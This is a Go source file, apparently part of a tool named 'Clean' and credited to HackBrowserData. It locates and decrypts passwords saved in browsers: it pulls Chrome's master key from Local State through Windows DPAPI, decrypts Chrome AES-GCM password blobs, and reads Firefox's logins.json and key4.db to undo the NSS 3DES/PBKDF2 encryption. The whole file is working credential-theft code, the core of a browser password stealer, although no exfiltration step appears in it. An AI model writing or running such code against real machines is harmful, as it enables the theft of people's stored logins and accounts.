package decrypt

// Credits to https://github.com/moonD4rk/HackBrowserData for most of this

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"crypto/sha256"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"github.com/equisde/Clean/core"
	"github.com/tidwall/gjson"
	"golang.org/x/crypto/pbkdf2"
)

func aes128CBCDecrypt(key, iv, encryptPass []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	dst := make([]byte, len(encryptPass))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(dst, encryptPass)
	dst = PKCS5UnPadding(dst)
	return dst, nil
}

func ChromeDecrypt(password, masterKey []byte) ([]byte, error) {
	if len(password) <= 15 {
		return nil, fmt.Errorf("Password is empty")
	}

	c, err := aes.NewCipher(masterKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}

	plainPass, err := gcm.Open(nil, password[3:15], password[15:], nil)
	if err != nil {
		return nil, err
	}

	return plainPass, nil
}

func Decrypt(data []byte) ([]byte, error) {
	if len(data) <= 15 {
		return nil, fmt.Errorf("Password is empty")
	}

	var outblob DATA_BLOB

	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))

	return outblob.ToByteArray(), nil
}

func (n NssPBE) Decrypt(globalSalt, masterPwd []byte) (key []byte, err error) {
	glmp := append(globalSalt, masterPwd...)
	hp := sha1.Sum(glmp)
	s := append(hp[:], n.EntrySalt...)
	chp := sha1.Sum(s)
	pes := PaddingZero(n.EntrySalt, 20)
	tk := hmac.New(sha1.New, chp[:])
	tk.Write(pes)
	pes = append(pes, n.EntrySalt...)
	k1 := hmac.New(sha1.New, chp[:])
	k1.Write(pes)
	tkPlus := append(tk.Sum(nil), n.EntrySalt...)
	k2 := hmac.New(sha1.New, chp[:])
	k2.Write(tkPlus)
	k := append(k1.Sum(nil), k2.Sum(nil)...)
	iv := k[len(k)-8:]

	return des3Decrypt(k[:24], iv, n.Encrypted)
}

func (m MetaPBE) Decrypt(globalSalt, masterPwd []byte) (key2 []byte, err error) {
	k := sha1.Sum(globalSalt)
	key := pbkdf2.Key(k[:], m.EntrySalt, m.IterationCount, m.KeySize, sha256.New)
	iv := append([]byte{4, 14}, m.IV...)
	return aes128CBCDecrypt(key, iv, m.Encrypted)
}

func (l LoginPBE) Decrypt(globalSalt, masterPwd []byte) (key []byte, err error) {
	return des3Decrypt(globalSalt, l.IV, l.Encrypted)
}

func des3Decrypt(key, iv []byte, src []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	sq := make([]byte, len(src))
	blockMode.CryptBlocks(sq, src)
	return sq, nil
}

func GetFireFoxLoginData(path string) (loginData []core.LoginStruct, err error) {
	path = filepath.Join(path, "logins.json")

	fileBytes, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}

	jsonData := gjson.GetBytes(fileBytes, "logins")
	if !jsonData.Exists() {
		return nil, fmt.Errorf("No JSON Data found")
	}

	for _, jsonValue := range jsonData.Array() {
		var tempStruct core.LoginStruct

		tempStruct.Url = jsonValue.Get("hostname").String()
		tempStruct.EncryptUser, err = base64.StdEncoding.DecodeString(jsonValue.Get("encryptedUsername").String())
		tempStruct.EncryptPass, err = base64.StdEncoding.DecodeString(jsonValue.Get("encryptedPassword").String())

		loginData = append(loginData, tempStruct)
	}

	return
}

func GetFireFoxKey(path string) (item1, item2, a11, a102 []byte, err error) {
	var (
		keyDB   *sql.DB
		pwRows  *sql.Rows
		nssRows *sql.Rows
	)

	keyDB, err = sql.Open("sqlite3", filepath.Join(path, "key4.db"))
	if err != nil {
		return nil, nil, nil, nil, err
	}
	defer keyDB.Close()

	pwRows, err = keyDB.Query(`SELECT item1, item2 FROM metaData WHERE id = 'password'`)
	core.HandleErr(err)
	defer pwRows.Close()

	for pwRows.Next() {
		if err := pwRows.Scan(&item1, &item2); err != nil {
			continue
		}
	}

	nssRows, err = keyDB.Query(`SELECT a11, a102 from nssPrivate`)
	core.HandleErr(err)
	defer nssRows.Close()

	for nssRows.Next() {
		if err := nssRows.Scan(&a11, &a102); err != nil {
			continue
		}
	}

	return
}

func GetMasterKey(dataPath string) ([]byte, error) {
	var masterKey []byte

	jsonFile, err := ioutil.ReadFile(dataPath)
	if err != nil {
		return nil, err
	}

	encryptedKey := gjson.Get(string(jsonFile), "os_crypt.encrypted_key")
	if !encryptedKey.Exists() {
		return nil, fmt.Errorf("No key")
	}

	decodedKey, err := base64.StdEncoding.DecodeString(encryptedKey.String())
	if err != nil {
		return nil, err
	}

	masterKey, err = Decrypt(decodedKey[5:])
	if err != nil {
		return nil, err
	}

	return masterKey, nil
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}

	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func NewASN1PBE(b []byte) (pbe ASN1PBE, err error) {
	var (
		n NssPBE
		m MetaPBE
		l LoginPBE
	)
	if _, err := asn1.Unmarshal(b, &n); err == nil {
		return n, nil
	}
	if _, err := asn1.Unmarshal(b, &m); err == nil {
		return m, nil
	}
	if _, err := asn1.Unmarshal(b, &l); err == nil {
		return l, nil
	}
	return nil, fmt.Errorf("Decode failed")
}

func PaddingZero(s []byte, l int) []byte {
	h := l - len(s)
	if h <= 0 {
		return s
	} else {
		for i := len(s); i < l; i++ {
			s = append(s, 0)
		}
		return s
	}
}

func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpad := int(src[length-1])
	return src[:(length - unpad)]
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)

	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])

	return d
}

type (
	ASN1PBE interface {
		Decrypt(globalSalt, masterPwd []byte) (key []byte, err error)
	}

	DATA_BLOB struct {
		cbData uint32
		pbData *byte
	}

	LoginPBE struct {
		CipherText []byte
		LoginSequence
		Encrypted []byte
	}

	LoginSequence struct {
		asn1.ObjectIdentifier
		IV []byte
	}

	MetaPBE struct {
		MetaSequenceA
		Encrypted []byte
	}

	MetaSequenceA struct {
		PKCS5PBES2 asn1.ObjectIdentifier
		MetaSequenceB
	}
	MetaSequenceB struct {
		MetaSequenceC
		MetaSequenceD
	}

	MetaSequenceC struct {
		PKCS5PBKDF2 asn1.ObjectIdentifier
		MetaSequenceE
	}

	MetaSequenceD struct {
		AES256CBC asn1.ObjectIdentifier
		IV        []byte
	}

	MetaSequenceE struct {
		EntrySalt      []byte
		IterationCount int
		KeySize        int
		MetaSequenceF
	}

	MetaSequenceF struct {
		HMACWithSHA256 asn1.ObjectIdentifier
	}

	NssPBE struct {
		NssSequenceA
		Encrypted []byte
	}
	NssSequenceA struct {
		DecryptMethod asn1.ObjectIdentifier
		NssSequenceB
	}

	NssSequenceB struct {
		EntrySalt []byte
		Len       int
	}
)

var (
	dllcrypt32  *syscall.LazyDLL = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 *syscall.LazyDLL = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData *syscall.LazyProc = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   *syscall.LazyProc = dllkernel32.NewProc("LocalFree")

	userProfile = os.Getenv("USERPROFILE")
)
